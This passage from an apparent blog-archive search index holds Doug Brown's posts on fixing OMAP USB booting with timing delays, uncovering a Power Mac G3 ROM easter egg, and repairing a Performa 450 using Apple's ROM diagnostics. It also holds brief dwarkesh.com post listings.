<li>Host sends boot command</li> <li>OMAP confirms it</li> </ul> </li> <li>Frame 2<ul> <li>Host sends length</li> <li>OMAP confirms it</li> </ul> </li> <li>Frame 3<ul> <li>Host sends first packet of bootloader data</li> <li>OMAP confirms it</li> <li>Host sends second packet of bootloader data</li> <li>OMAP says it's not ready</li> <li>Host pings</li> <li>OMAP says it's ready now</li> <li>Host sends second packet of bootloader data again</li> <li>OMAP confirms it</li> </ul> </li> </ul> <p>And then from that point on, it was just a process of sending the rest of the data like that. About 5 data packets would fit into each frame. My newer computer's traffic looked like this instead:</p> <ul> <li>Frame 1<ul> <li>Host sends boot command</li> <li>OMAP confirms it</li> <li>Host sends length</li> <li>OMAP says it's not ready</li> <li>Host pings a few times until the OMAP is ready</li> <li>Host sends length again</li> <li>OMAP confirms it</li> <li>Host sends first packet of bootloader data</li> <li>OMAP confirms it</li> <li>Host sends second packet of bootloader data</li> <li>OMAP says it's not ready</li> <li>Host pings several times, OMAP never says it's ready during the rest of this frame</li> </ul> </li> <li>Frame 2<ul> <li>Host pings</li> <li>OMAP responds with a STALL packet</li> </ul> </li> </ul> <p>The newer xHCI host controller was trying its best to efficiently squeeze a lot of packets into the first frame. Even though this is a pattern that should be perfectly valid to follow when communicating with a USB device, the OMAP bootloader was clearly not happy about something, and eventually sent a STALL packet before omap_loader made much progress. Various USB packet traces on different modern computers revealed similar issues. It would either STALL after the second packet, or just NAK forever and never accept additional incoming data.</p> <p>Inspired by other comments about adding delays, I tried to work around this by inserting an artificial 1 ms delay before every <code>libusb_bulk_transfer()</code> call. This would force modern machines to slow down a little bit. As soon as I added those delays, all of my new computers had no trouble uploading X-Loader to the OMAP. So yeah, I think the OMAP just doesn't like receiving USB data too quickly.</p> <p>That wasn't the end of this little project, though. The 1 ms delay fixed the issue with getting X-Loader to run, but the newer computers also ran into problems while trying to upload U-Boot through X-Loader!</p> <pre><code>[-] device timed out while transfering in 512 bytes (got 0)  \n[-] device timed out while transfering in 512 bytes (got 0)  \n[-] device timed out while transfering in 512 bytes (got 0)  \n[-] failed to read command from X-Loader  \n[-] failed to transfer the additional files in to memory\n</code></pre> <p>Rats. I went back to the USB sniffer for more research.</p> <p>This time, it was a different problem. I found the point where the host would try to read the initial request from X-Loader: <code>USBf</code>. On my older computer, this worked fine; it received a 13-byte string from X-Loader: <code>USBffile req</code> followed by a null terminator. It was happy with this, and omap_usbload kept going on with the rest of the file load process and everything succeeded.</p> <p>On the newer computer, some shenanigans were going on. Let's look at the USB trace in depth:</p> <p></p> <p>The 335-byte packet contains 332 actual bytes of data (the packet ID and CRC account for the other 3 bytes), and is the final chunk of X-Loader. It was successfully received and confirmed by the OMAP with an ACK. At that point, we can assume that the OMAP has begun jumping into X-Loader to start it up.</p> <p>A millisecond later (due to the delay I added), we start trying to read from X-Loader. It's clearly too soon, though; I don't think X-Loader has finished starting up yet. There's nothing ready to read. So these IN/NAK packets continue on for about 5 more milliseconds, which is totally normal. But then, something finally happens: the OMAP stops responding to our IN packets. My computer's USB host controller tries three times (see the three IN packets in a row below?) and then it gives up. I'm guessing this is around the same time that X-Loader is doing its own hardware initialization, so maybe the OMAP's USB controller is temporarily disabled.</p> <p></p> <p>This all makes sense so far. We tried to read too quickly before X-Loader finished starting up, so when it did finally load, there was a brief moment where it would not respond to IN packets. The host controller didn't like this and stopped trying, so all we saw from that point on was SOF packets because we weren't attempting any more USB reads. Some of my other computers gave up after 15 unanswered IN packets instead of 3. I'm not sure if that's a difference in the host controller or what, but it's the same root problem.</p> <p>You may be wondering: why didn't the older computers run into this same issue? They were also trying to talk with X-Loader too early, so why wouldn't they run into this same roadblock? The answer is that their older host controllers are more tolerant of the missing NAKs. I recorded a similar trace with one of my older computers that works fine without any patches to omap_loader. It also immediately began sending IN packets trying to read from X-Loader way too soon. Just like the problematic computers, it experienced a brief period where the OMAP stopped responding to INs with NAKs. The difference is that it didn't abandon hope so quickly. There were 33 unanswered IN packets. After that, the OMAP continued responding with NAKs again and everything was fine from that point on. 17 ms after we had originally finished sending out X-Loader, the OMAP finally responded with an actual data packet. So that's the total time it took for X-Loader to launch.</p> <p>Back to the newer computers that weren't playing nicely. I was still confused. Even though this is a problem with newer host controllers, omap_loader has a retry mechanism! If it fails to read X-Loader's initial data, it will try again 2 seconds later. You'd think it would succeed at that point. Let's see what happens:</p> <p></p> <p>Ah, interesting. The retry is actually 3 seconds later. I'm guessing the first failed read attempt had a 1-second timeout, so then with a 2-second retry timer, that adds up to 3 seconds total.</p> <p>Anyway, something funky happens here. The USB host finally reads the 13-byte string from X-Loader as a DATA1 packet (again, it shows up as 16 bytes because of the packet ID and CRC). The host then acknowledges reception with an ACK, but for some bizarre reason, it immediately continues attempting to read more data! I won't show the whole trace, but the host keeps polling with IN packets for a whole second. And of course, they're all NAKed. X-Loader knows it successfully sent data to us, so it has shifted over to waiting for the host to send an OUT packet instead. It's like the host controller gets confused and expects X-Loader to send more data. The kernel never reports those 13 bytes back to libusb, even after the 1-second transfer timeout expires.</p> <p>I don't consider myself to be a USB expert, so maybe I'm misunderstanding something. This behavior just seems wrong, though. When my computer finally reads 13 bytes (proven by the sniffer trace shown above), why isn't this data reported back to libusb? I would have expected the reception of a short DATA0/1 packet to cause the host controller to stop reading and return the data back immediately. Is this some kind of strange bug in the Linux kernel or the host controller hardware or something? I don't know for sure. I find this behavior to be very odd, and I can't explain it. My off-the-cuff guess is that the initial failure to respond to the three IN packets results in something getting out of sync in the host controller, but I really don't know for sure. In my opinion, the retry should have worked, but clearly, something got confused. Not sure what. I don't think it's libusb's fault, though.</p> <p>I hate adding arbitrary delays in order to fix things, but a 20-millisecond delay between uploading X-Loader and attempting to read from it fixes this final issue. It ensures that the OMAP has been given ample time to launch X-Loader before we try reading from it, preventing the host controller from encountering the weird situation with unanswered IN packets.</p> <p>After all of this tinkering and patching that I did to get things to play nicely on newer machines, here is a successful run of omap_loader:</p> <pre><code>[+] successfully opened 0451:d009 (Texas Instruments OMAP3430)  \n[+] got ASIC ID - Num Subblocks [05], Device ID Info [01050134300757], Reserved [13020100], Ident Data [1215010000000000000000000000000000000000000000], Reserved [1415010000000000000000000000000000000000000000], CRC (4 bytes) [150901f7488f2800000000]  \n[+] uploading 'u-boot.bin' (size 777760) to 0x80800000  \n[+] jumping to address 0x80800000  \n[+] successfully transfered 2 files\n</code></pre> <p>Meanwhile, the following output pops up on the BeagleBoard's UART:</p> <pre><code>Texas Instruments X-Loader 1.5.1 (Nov 15 2011 - 09:36:31)  \nBeagle Rev C4  \nTrying load from USB  \nUSBLOAD_CMD_FILE total = 12 addr = 0x73425355 val = 0xbde20 val = 0x80800000  \ngot file addr = 0x808bde20  \nUSBLOAD_CMD_JUMP total = 8 addr = 0x6a425355 val = 0x80800000\n\n\nU-Boot 2023.10 (May 25 2024 - 22:05:27 -0700)\n\nOMAP3530-GP ES3.1, CPU-OPP2, L3-165MHz, Max CPU Clock 720 MHz  \nModel: TI OMAP3 BeagleBoard  \nOMAP3 Beagle board + LPDDR/NAND  \nI2C:   ready  \nDRAM:  256 MiB  \nCore:  44 devices, 18 uclasses, devicetree: separate  \nNAND:  256 MiB  \nMMC:   OMAP SD/MMC: 0  \nLoading Environment from NAND... *** Warning - bad CRC, using default environment\n\nBeagle Rev C4  \nTimed out in wait_for_event: status=0000  \nCheck if pads/pull-ups of bus are properly configured  \nNo EEPROM on expansion board  \nOMAP die ID: 79b8000400000000040398da1401c009  \nNet:   No ethernet found.  \nHit any key to stop autoboot:  2\n</code></pre> <p>I believe the \"Timed out in wait_for_event\" error is harmless. Anyway, success! It loads U-Boot! You can imagine that I could have easily transmitted a Linux kernel and initramfs as well, and fully booted this thing over USB. Once U-Boot is running, I can do whatever I want.</p> <p>With these simple delay tweaks, omap_loader works great on all modern computers I've thrown at it, including Raspberry Pis. The only \"gotcha\" I've encountered is that some slower computers (my i3-7100U laptop and a Raspberry Pi Zero) don't forward the USB hotplug event through udev quickly enough before the BeagleBoard decides it's not being asked to boot over USB. omap_loader never gets past scanning for a device, even though the <code>dmesg</code> log clearly shows that it was detected:</p> <pre><code>[4076310.258842] usb 11-5: new high-speed USB device number 65 using xhci_hcd  \n[4076310.407944] usb 11-5: unable to get BOS descriptor or descriptor too short  \n[4076310.410041] usb 11-5: New USB device found, idVendor=0451, idProduct=d009, bcdDevice= 0.00  \n[4076310.410046] usb 11-5: New USB device strings: Mfr=33, Product=37, SerialNumber=0  \n[4076310.410051] usb 11-5: Product: OMAP3430  \n[4076310.410054] usb 11-5: Manufacturer: Texas Instruments  \n[4076310.710703] usb 11-5: USB disconnect, device number 65\n</code></pre> <p>As you can see, it's a very short timeframe; just like TI's manual says, it only stays connected for about 300 ms if it doesn't hear from the host. I guess that's not enough time for udev on some computers. The only solution I found for this issue on my slower machines was to compile a custom version of libusb with udev disabled, which forces it to directly use netlink for hotplug detection instead.</p> <p>My patch also limits libusb transfers to 512 bytes at a time. I don't think this change is critical, though. It fixed an issue I ran into where my bus was really loaded and libusb reported a memory error. I don't think it actually helps anything in most cases as long as people aren't performing crazy big USB transfers at the same time.</p> <p>In summary:</p> <ul> <li>Trying to write USB data to the OMAP's on-chip bootloader too quickly seems to hit some edge cases that it doesn't handle correctly. A 1 ms delay fixes this.</li> <li>Trying to read from X-Loader before it's ready to go irritates newer USB host controllers when they send out several IN packets without receiving any response (not even a NAK). A 20 ms delay fixes this. <ul> <li>Even retries afterward fail; the host controller gets out of sync due to the unanswered IN packets or something like that.</li> </ul> </li> <li>On some slower computers, udev doesn't give you enough time to respond to the OMAP's 300 ms timeout, so libusb never detects the hotplug. This can be solved with a custom libusb that uses netlink instead of udev.</li> </ul> <p>I opened up a PR to submit these fixes (except for the udev thing) upstream to omap_loader in 2024. Why am I writing about this now? Well, remember when I mentioned Nest earlier? Google ended support for older Nest thermostats last month, which renewed some interest in merging my reliability improvements so that people can flash custom firmware to their Nest thermostats. Those old Nest devices also use OMAP processors.</p> <p>What it boils down to is: all this tinkering I did last year with pointlessly booting old BeagleBoards over USB accidentally ended up being useful. It helped out some Nest thermostat revival projects that have been popping up in the last month. So I thought now might be a fun time to talk about my tiny involvement with that. Yay! It's always fun when a random side project unexpectedly helps other people.</p>"},{"location":"downtowndougbrown.com/Finding%20a%2027-year-old%20easter%20egg%20in%20the%20Power%20Mac%20G3%20ROM_20260205/","title":"Finding a 27-year-old easter egg in the Power Mac G3 ROM","text":"<p>\u6765\u6e90: https://www.downtowndougbrown.com \u94fe\u63a5: https://www.downtowndougbrown.com/2025/06/finding-a-27-year-old-easter-egg-in-the-power-mac-g3-rom/ \u65e5\u671f: Tue, 24 Jun 2025 07:49:28 +0000</p> <p>I was recently poking around inside the original Power Macintosh G3's ROM and accidentally discovered an easter egg that nobody has documented until now.</p> <p>This story starts with me on a lazy Sunday using Hex Fiend in conjunction with Eric Harmon's Mac ROM template (ROM Fiend) to look through the resources stored in the Power Mac G3's ROM. This ROM was used in the beige desktop, minitower, and all-in-one G3 models from 1997 through 1999.</p> <p></p> <p>As I write this post in mid-2025, I'm having a really difficult time accepting the fact that the Power Mac G3 is now over 27 years old. Wow!</p> <p>While I was browsing through the ROM, two things caught my eye:</p> <p>First, there was a resource of type <code>HPOE</code> which contained a JPEG image of a bunch of people, presumably people who worked on these Mac models.</p> <p></p> <p>This wasn't anything new; Pierre Dandumont wrote about it back in 2014. However, in his post, he mentioned that he hadn't figured out how to display this particular hidden image on the actual machine. Several older Macs have secret keypress combinations to show similar pictures, but the mechanism for displaying this one was a complete mystery.</p> <p>The second thing I found was a big clue: I kept looking for other interesting information in the ROM, and eventually I stumbled upon <code>nitt</code> resource ID 43, named \"Native 4.3\". Thanks to Keith Kaisershot's earlier Pippin research, I was quickly able to conclude that this was the PowerPC-native SCSI Manager 4.3 code. The SCSI Manager wasn't what piqued my interest about this resource though. At the very end of the data, I found some interesting Pascal strings:</p> <p></p> <p>These strings were definitely intriguing:</p> <ul> <li>.Edisk</li> <li>secret ROM image</li> <li>The Team</li> </ul> <p>The \"secret ROM image\" text in particular seemed like it could be related to the picture shown above. I decided to dive deeper to see if I could figure out why the SCSI Manager contained these strings, in the hopes that I could solve the mystery. Would this be the clue I needed in order to figure out how to instruct the Power Mac G3 to display this picture?</p> <p>Some quick Internet searching for the phrase \"secret ROM image\" revealed that it had been used for easter eggs with earlier PowerPC Macs. On those machines, you just had to type the text, select it, and drag it to the desktop. Then, the picture would appear. That approach didn't work on the G3.</p> <p>I suspected there was some similar way to access this hidden image, but nobody had documented it, at least not as far as I could find. So I had no choice but to disassemble the code and see where this text was used. What is it with me and all these crazy rabbit holes?</p> <p>I extracted the entire <code>nitt</code> resource ID 43 to a file and inspected it:</p> <pre><code>$ file nitt43  \nnitt43: header for PowerPC PEF executable\n</code></pre> <p>That wasn't too surprising, considering that the first twelve bytes were \"Joy!peffpwpc\". I fed this entire file into Ghidra, which immediately recognized it as a PEF file and had no trouble loading it. Although I'm pretty familiar with reading x86 and ARM assembly, I know essentially nothing about PowerPC assembly code. Thankfully, Ghidra's decompiler worked very well with this file.</p> <p>There was one problem, though: it didn't detect any references to the \"secret ROM image\" string, other than inside of a huge list of pointers to variables. After scratching my head a little bit, I realized that Ghidra wasn't doing a great job of finding references to several variables. Luckily, running Auto Analyze a second time after the initial analysis seemed to help it find several more references to things, including all of the strings I was interested in! I didn't change any options with the analyzer; it just found more stuff on the second run.</p> <p></p> <p>The function that used all of these strings was definitely doing something with the .EDisk driver, which I already knew was the RAM disk driver because of past hackery. It seemed to be using <code>strncmp()</code> to see if a string was equal to \"secret ROM image\", and if so, it would create/open/write a file named \"The Team\".</p> <p></p> <p>I cleaned up this decompilation quite a bit by giving names to variables and figuring out data types. Fortunately, a lot of the functions like <code>PBGetVInfoSync()</code> had lots of public documentation, so I just had to tell Ghidra about the various Mac Toolbox structs being used.</p> <p></p> <p>Okay, that's a lot easier to understand!</p> <p>I couldn't figure out how to format the 32-bit function arguments such as 0x48504f45 into four-letter codes like <code>HPOE</code>, so that's what the comments are. Ghidra simply wouldn't let me display them as ASCII in the decompilation no matter what I did, even though hovering over the constant showed a tooltip with the equivalent text. This is easy to do in IDA, but I couldn't figure out how to convince Ghidra to do it. I tried Set Equate, but it didn't change anything. If someone knows how to make it work, I'd love to hear how!</p> <p>Anyway, the decompiled code shown above makes sense, and here's a summary of what it does:</p> <ul> <li>It looks for a driver called .Edisk. (The driver is really named .EDisk, but I guess Mac OS doesn't care about case sensitivity for this.)</li> <li>It finds a disk associated with that driver (the RAM disk).</li> <li>It looks for a volume associated with that disk.</li> <li>If the volume is named \"secret ROM image\": <ul> <li>It loads <code>HPOE</code> resource ID 1, which contains the JPEG image data.</li> <li>It creates a file of creator <code>ttxt</code> and type <code>JPEG</code> called \"The Team\".</li> <li>It opens the file, writes the JPEG data to it, and closes it.</li> <li>Then it does something with the driver control entry that I didn't bother trying to understand further.</li> </ul> </li> </ul> <p>Okay, interesting! So this code was clearly looking for the RAM disk to be named \"secret ROM image\", but I wasn't sure exactly how to trigger it. This function was only ever called in one other place: another function, which was checking to see if its first argument was equal to the value 0x3DA (decimal 986).</p> <p>I didn't have my beige G3 handy for tinkering, so instead, I mentioned what I had discovered in #mac68k on Libera. ^alex came to the rescue after playing around in Infinite Mac with the hints I had given. They quickly figured out that the trick was to format the RAM disk, and type the special text into the format dialog:</p> <p></p> <p>I got out my desktop G3, tested it out on real hardware, and sure enough, it worked! If you want to try it for yourself just like ^alex did, you can run Infinite Mac in your browser using this link, which sets up an emulated beige G3 running Mac OS 8.1 using DingusPPC. There's a quirk that causes it to fail to resolve an alias at startup. I intentionally disabled it; just click Stop when the error pops up. Here are instructions:</p> <ul> <li>Enable the RAM Disk in the Memory control panel.</li> <li>Choose Restart from the Special menu.</li> <li>After the desktop comes back up, select the RAM Disk icon.</li> <li>Choose Erase Disk from the Special menu.</li> <li>Type the secret ROM image text exactly as depicted above.</li> <li>Click Erase.</li> </ul> <p>When you open the newly-formatted RAM disk, you should see a file named \"The Team\":</p> <p></p> <p>If you double-click the file, SimpleText will open it:</p> <p></p> <p>Based on various people's tests, including my own, it sounds like this trick works all the way up through Mac OS 9.0.4, but 9.1 may have been the first version where it finally stopped working.</p> <p>As far as I have been able to determine, this particular secret was undiscovered until now. People definitely knew the image was there in the ROM, but nobody had figured out how to actually activate it. This is probably one of the last easter eggs that existed in the Mac prior to Steve Jobs reportedly banning them in 1997 when he returned to Apple. I wonder if he ever knew about this one?</p> <p>Special thanks to ^alex for figuring out that the RAM Disk needed to be erased in order to activate the easter egg! I'm not sure I would have thought to try that, and it would have taken a lot more work to trace through the rest of the code to figure it out.</p> <p>If you are reading this post and you were on \"The Team\", I'd love to hear about it! I'm curious if anyone who worked at Apple in the era remembers this little secret.</p>"},{"location":"downtowndougbrown.com/Finding%20a%20broken%20trace%20on%20my%20old%20Mac%20with%20the%20help%20of%20its%20ROM%20diagnostics_20260205/","title":"Finding a broken trace on my old Mac with the help of its ROM diagnostics","text":"<p>\u6765\u6e90: https://www.downtowndougbrown.com \u94fe\u63a5: https://www.downtowndougbrown.com/2025/12/finding-a-broken-trace-on-my-old-mac-with-the-help-of-its-rom-diagnostics/ \u65e5\u671f: Tue, 30 Dec 2025 01:52:17 +0000</p> <p>Yesterday, for the first time in about a year, I tried powering on the Macintosh Performa 450 (LC III) from my past writeup about Apple's backwards capacitor.</p> <p></p> <p>It didn't work. The screen was black, it played the startup sound, and then immediately followed up with the \"Chimes of Death\". Nothing else happened from that point on. Here's what it sounded like:</p> <p>This was a little frustrating because last year I had already replaced all of the capacitors and cleaned where they had leaked, so I didn't expect to encounter any problems with it so soon. The machine had worked fine the last time I'd tried it! But despite all that, something was failing during the power-on tests in Apple's ROM, prompting it to play the chimes of death. I remembered that people have been working towards documenting the Mac ROM startup tests and using them to diagnose problems, so I decided to give it a shot and see if Apple's Serial Test Manager could identify my Performa's issue. Where was the fault on this complicated board? Sure, I could test a zillion traces by hand, but why bother when the computer already knows what is wrong?</p> <p></p> <p>I hooked up the Mac's RS-422 modem port to my computer's RS-232 serial port using a couple of adapter cables to convert from Mini-DIN-8 to DB-25 and then DB-25 to DE-9. Next I opened up PuTTY, configured the serial port on my PC for 9600 baud, 8 data bits, no parity, and 2 stop bits (8N2), and tried typing the command to put the Serial Test Manager into ASCII mode:</p> <pre><code>*A\n</code></pre> <p>It echoed the command back to me, so it was working! Next, I typed the command to return the status:</p> <pre><code>*R\n</code></pre> <p>It printed this back to me:</p> <pre><code>2F1E122B0003*R\n</code></pre> <p>According to the documentation I linked earlier, this result shows that the status register contained the value 0x2F1E122B and the major error code was 0x0003. Error code 3 means RAM Bank A failure. The 0x2F1E122B seemed like gibberish, but I thought it was supposed to be a bitmask of bad bits. I later figured out that the value in the status register is always junk after the chimes of death play, because the code that plays the sound overwrites it.</p> <p>The RAM test definitely knew which part of the RAM was failing though. I just needed it to give me all of the details. So I manually ran a test over a small range of RAM addresses:</p> <pre><code>*4  \n*000001000  \n*100002000  \n*T000200010001\n</code></pre> <p>What these commands do according to the documentation:</p> <ul> <li>*4 clears the result of any previous test</li> <li>*0 sets the value of register A0, containing the start address of the test. I set it to 0x00001000.</li> <li>*1 sets the value of register A1 for the end address of the test. I set it to 0x00002000.</li> <li>*T runs a \"critical test\". 0x0002 is the test (mod3 RAM test), the first 0x0001 is the number of times the test will run, and the second 0x0001 contains option flags.</li> </ul> <p>Here is the printout I got back from the Mac when I ran these commands:</p> <pre><code>*4  \n*0  \n*1  \n*ERROR**T\n</code></pre> <p>This was actually really good news! It accepted the first three commands, and then the RAM test failed. This was consistent with what I expected to see. I tried to display the results again, hopeful that this time the status register would contain useful info about the failed RAM.</p> <pre><code>*R\n</code></pre> <p>It happily printed this back:</p> <pre><code>000008000000*R\n</code></pre> <p>Yay! This meant the status register was 0x00000800. The status register value showed which bit(s) in the RAM were acting up. In other words, the test was telling me that bit 11 was the problem.</p> <p>I didn't have a RAM SIMM installed, so the problem was clearly with the 4 MB of onboard memory. It was very doubtful that a RAM chip had just randomly gone bad since the last time I'd powered up this machine. More likely, the leaked capacitor goo had eaten away another trace over time because I hadn't cleaned the board well enough. I grabbed my multimeter and checked the continuity of D11 between the RAM chip and various other components on the board. Luckily, Bomarc reverse-engineered the LC III logic board a while ago and their schematics are floating around on the internet these days.</p> <p>The schematics indicate that onboard RAM data bit 11 is supplied by U28, pin 25. It's hooked directly to the CPU's data bus, which goes to the RAM SIMM slot, the CPU itself, an optional FPU, the PDS slot, one of the ROM chips (U19), and other random chips on the board.</p> <p>Thanks to max1zzz's LC III Reloaded replica of the LC III logic board, I was easily able to follow the traces and verify where things were hooked up. Sometimes Bomarc's schematics can be a little iffy, so it's always good to double check them.</p> <p>I confirmed that U28 pin 25 had a connection to the RAM SIMM socket right next to it (pin 55), but it wasn't connected to anything else. The ROM chip U19 was the easiest to test against. I also checked that other nearby data lines did indeed have good continuity between the RAM and ROM, so it was just this one data line that was bad. This all made sense and was consistent with the RAM test results. There was definitely a broken trace somewhere. Following along with max1zzz's replica board Gerber files, I had a pretty good idea of where the damage was: a cluster of tiny vias near where an electrolytic capacitor had badly leaked. Several of these vias look pretty icky. Also, please ignore my terrible alignment on the replacement tantalum cap.</p> <p></p> <p>I was in a hurry to get this Performa running again. Instead of trying to repair the bad trace/via, I opted for a quick bodge wire on the bottom of the board between pin 55 of the RAM SIMM socket and pin 21 of the relevant ROM socket (U19). That was easier than trying to repair a tiny via. I might experiment more with via repair in the future, though!</p> <p></p> <p>With the bodge wire in place, my Performa 450 is alive once again! For now, anyway. My board probably still has some issues. That's the tricky thing with capacitor leakage. You might think you've cleaned it well, but electrolyte could still be lurking there somewhere, slowly eating away more and more copper. I know some people have had good luck using ultrasonic cleaners, although I hear that they can damage oscillators.</p> <p>If you're feeling nostalgic and/or have way too much time on your hands, and you're comfortable with building MAME from source, you can replicate my successful diagnosis in an emulator using MAME on Linux. Here's a quick patch I applied to screw up bit 11 of the RAM on the emulated LC III:</p> <pre><code>diff --git a/src/mame/apple/sonora.cpp b/src/mame/apple/sonora.cpp\nindex 141e3e9950d..7d07addc29e 100644\n--- a/src/mame/apple/sonora.cpp\n+++ b/src/mame/apple/sonora.cpp\n@@ -191,6 +191,9 @@ u32 sonora_device::rom_switch_r(offs_t offset)\n                offs_t memory_mirror = memory_end &amp; ~memory_end;\n\n                space.install_ram(0x00000000, memory_end &amp; ~memory_mirror, memory_mirror, memory_data);\n+               space.install_write_tap(0x0000, 0xffff, \"faulty_ram\", [&amp;](offs_t offset, u32 &amp;data, u32 mem_mask) {\n+                       data &amp;= ~0x0800;\n+               });\n                m_overlay = false;\n        }\n</code></pre> <p>Then, you can run MAME with this command:</p> <pre><code>./mame maclc3 -window -nomaximize -printer pty\n</code></pre> <p>This allocates a pseudo terminal that acts as the serial port. You may notice that I included <code>-printer</code> instead of <code>-modem</code> in the command, even though the physical port I used is definitely the modem port. That's because the current version of MAME as of this writing seems to have them swapped! Sometime in the future when that is fixed, you'll likely need to correctly type <code>-modem</code> instead.</p> <p>With my patch applied, running MAME like this should give you the startup sound followed immediately by the error sound. Figure out which pseudo-terminal is linked to the port (it was <code>/dev/pts/1</code> on my machine) and open it with your favorite serial program, such as minicom. You can now type all the commands I used to diagnose the problem.</p> <p></p> <p>Anyway, this was a successful use of Apple's ROM diagnostics to quickly solve my issue. It was much easier than manually checking continuity of a zillion PCB traces! Back in the day, Apple had a service tool called the TechStep that was capable of performing some of these diagnostics. There's even a modern clone of it, which happens to also be created by max1zzz. However, I'm not sure exactly how useful this device would have been for service techs other than as a pass/fail indicator. Wasn't Apple's policy just to replace full boards, similar to how it is today? Maybe they repaired faulty returned boards and reused them as service part stock. I'm not sure!</p> <p>By the way, this wasn't my first successful use of the Serial Test Manager. Earlier this year, I also fixed a Performa 410 (LC II) that was experiencing the Chimes of Death. The failure code was 0x30, indicating an Egret error. Egret is the name of the logic board's microcontroller that handles the Apple Desktop Bus, battery-backed PRAM, and some power on stuff. After the ROM diagnostics pointed me in that direction, I did a much better job of cleaning the cap leakage around it, and the problem completely went away. So that's now two times that this cool functionality has helped me.</p> <p>I'll talk more about my somewhat special Performa 410 in a future post!</p>"},{"location":"dwarkesh.com/","title":"dwarkesh.com","text":"<p>\u8bbf\u95ee\u535a\u5ba2</p>"},{"location":"dwarkesh.com/#_1","title":"\u6700\u65b0\u6587\u7ae0","text":""},{"location":"dwarkesh.com/#1-hiring-scouts-to-help-me-find-guests","title":"1. Hiring scouts to help me find guests","text":"<p>\u94fe\u63a5: https://www.dwarkesh.com/p/hiring-scouts-to-help-me-find-guests</p> <p>\u65e5\u671f: Thu, 15 Jan 2026 16:02:50 GMT</p> <p>\u6458\u8981: $100/hour, fully remote. Ideal candidate is maybe a grad student/post doc/or working in one of: bio, history, econ, math/physics, AI/hardware.</p>"},{"location":"dwarkesh.com/#2-what-ive-been-reading-recently-jan-10-2026","title":"2. What I've been reading recently - Jan 10, 2026","text":"<p>\u94fe\u63a5: https://www.dwarkesh.com/p/notes-jan-10-2026</p> <p>\u65e5\u671f: Sat, 10 Jan 2026 20:30:07 GMT</p> <p>\u6458\u8981: Nonlinear dynamics and Chaos, Machines of Loving Grace, Max Hodak\u2019s theory of consciousness, Neural network training makes beautiful fractals</p>"},{"location":"dwarkesh.com/#3-adam-marblestone-ai-is-missing-something-fundamental-about-the-brain","title":"3. Adam Marblestone \u2013 AI is missing something fundamental about the brain","text":"<p>\u94fe\u63a5: https://www.dwarkesh.com/p/adam-marblestone</p> <p>\u65e5\u671f: Tue, 30 Dec 2025 17:07:17 GMT</p> <p>\u6458\u8981: The brain's secret sauce is its reward functions, not its architecture.</p>"},{"location":"dwarkesh.com/#4-an-audio-version-of-my-blog-post-thoughts-on-ai-progress-dec-2025","title":"4. An audio version of my blog post, Thoughts on AI progress (Dec 2025)","text":"<p>\u94fe\u63a5: https://www.dwarkesh.com/p/thoughts-on-ai-progress-dec-2025-video</p> <p>\u65e5\u671f: Tue, 23 Dec 2025 20:24:48 GMT</p>"},{"location":"dwarkesh.com/#5-sarah-paine-why-russia-lost-the-cold-war","title":"5. Sarah Paine \u2013 Why Russia Lost the Cold War","text":"<p>\u94fe\u63a5: https://www.dwarkesh.com/p/sarah-paine-cold-war</p> <p>\u65e5\u671f: Fri, 19 Dec 2025 17:41:19 GMT</p> <p>\u6458\u8981: Oil crisis, Sino-Soviet split, ethnic rebellions, and arms build-up</p>"},{"location":"dwarkesh.com/01_Hiring_scouts_to_help_me_find_guests/","title":"Hiring scouts to help me find guests","text":"<p>\u539f\u6587\u94fe\u63a5: https://www.dwarkesh.com/p/hiring-scouts-to-help-me-find-guests \u53d1\u5e03\u65e5\u671f: Thu, 15 Jan 2026 16:02:50 GMT</p> <p>$100/hour, fully remote. Ideal candidate is maybe a grad student/post doc/or working in one of: bio, history, econ, math/physics, AI/hardware.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"dwarkesh.com/02_What_I_ve_been_reading_recently_-_Jan_10__2026/","title":"What I've been reading recently - Jan 10, 2026","text":"<p>\u539f\u6587\u94fe\u63a5: https://www.dwarkesh.com/p/notes-jan-10-2026 \u53d1\u5e03\u65e5\u671f: Sat, 10 Jan 2026 20:30:07 GMT</p> <p>Nonlinear dynamics and Chaos, Machines of Loving Grace, Max Hodak\u2019s theory of consciousness, Neural network training makes beautiful fractals</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"dwarkesh.com/03_Adam_Marblestone___AI_is_missing_something_fundame/","title":"Adam Marblestone \u2013 AI is missing something fundamental about the brain","text":"<p>\u539f\u6587\u94fe\u63a5: https://www.dwarkesh.com/p/adam-marblestone \u53d1\u5e03\u65e5\u671f: Tue, 30 Dec 2025 17:07:17 GMT</p> <p>The brain's secret sauce is its reward functions, not its architecture.</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"dwarkesh.com/04_An_audio_version_of_my_blog_post__Thoughts_on_AI_p/","title":"An audio version of my blog post, Thoughts on AI progress (Dec 2025)","text":"<p>\u539f\u6587\u94fe\u63a5: https://www.dwarkesh.com/p/thoughts-on-ai-progress-dec-2025-video \u53d1\u5e03\u65e5\u671f: Tue, 23 Dec 2025 20:24:48 GMT</p> <p>\u6682\u65e0\u6458\u8981</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"dwarkesh.com/05_Sarah_Paine___Why_Russia_Lost_the_Cold_War/","title":"Sarah Paine \u2013 Why Russia Lost the Cold War","text":"<p>\u539f\u6587\u94fe\u63a5: https://www.dwarkesh.com/p/sarah-paine-cold-war \u53d1\u5e03\u65e5\u671f: Fri, 19 Dec 2025 17:41:19 GMT</p> <p>Oil crisis, Sino-Soviet split, ethnic rebellions, and arms build-up</p> <p>\u672c\u6587\u5185\u5bb9\u7248\u6743\u5f52\u539f\u4f5c\u8005\u6240\u6709\uff0c\u4ec5\u4f9b\u5b66\u4e60\u4ea4\u6d41\u4f7f\u7528\u3002</p>"},{"location":"dynomight.net/","title":"dynomight.net","text":"<p>science and existential angst</p> 